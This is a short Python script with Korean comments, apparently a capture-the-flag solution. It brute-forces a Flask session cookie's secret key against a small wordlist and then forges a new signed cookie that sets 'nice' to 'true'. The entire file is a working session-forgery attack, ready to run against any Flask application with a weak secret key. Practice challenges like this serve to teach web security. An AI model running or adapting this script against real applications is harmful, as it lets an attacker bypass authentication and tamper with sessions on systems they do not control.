import hashlib
from itsdangerous import URLSafeTimedSerializer, BadSignature
from flask.sessions import SecureCookieSessionInterface
# 1. 원본 쿠키와 예상되는 키 리스트
original_cookie = "eyJuaWNlIjoiZmFsc2UifQ.aald4w.NF_zGS1j2ojeDFslCD_JN5eSr2U"
candidates = ['santa', 'christmas', 'rootsquare', 'dreamhack', 'secret', '1234', 'santaclaus', 'Chr1stmas']
# 2. 검증용 클래스
class SimpleSerializer:
    def __init__(self, secret_key):
        self.secret_key = secret_key
    def get_serializer(self):
        return URLSafeTimedSerializer(
            self.secret_key,
            salt='cookie-session',
            serializer=SecureCookieSessionInterface.serializer,
            signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1}
        )
print("--- 키 찾기 시작 ---")
found_key = None
for key in candidates:
    try:
        serializer = SimpleSerializer(key).get_serializer()
        # 원본 쿠키가 이 키로 풀리는지 확인
        data = serializer.loads(original_cookie)
        print(f"[+] 찾았다! 비밀키는: {key}")
        found_key = key
        break
    except BadSignature:
        continue
if found_key:
    # 3. 찾은 키로 'nice': 'true' 쿠키 생성
    serializer = SimpleSerializer(found_key).get_serializer()
    new_cookie = serializer.dumps({'nice': 'true'})
    print(f"\n[★] 생성된 새로운 쿠키 값:\n{new_cookie}")
else:
    print("\n[-] 리스트에 맞는 키가 없습니다. 다른 단어를 추가해보세요.")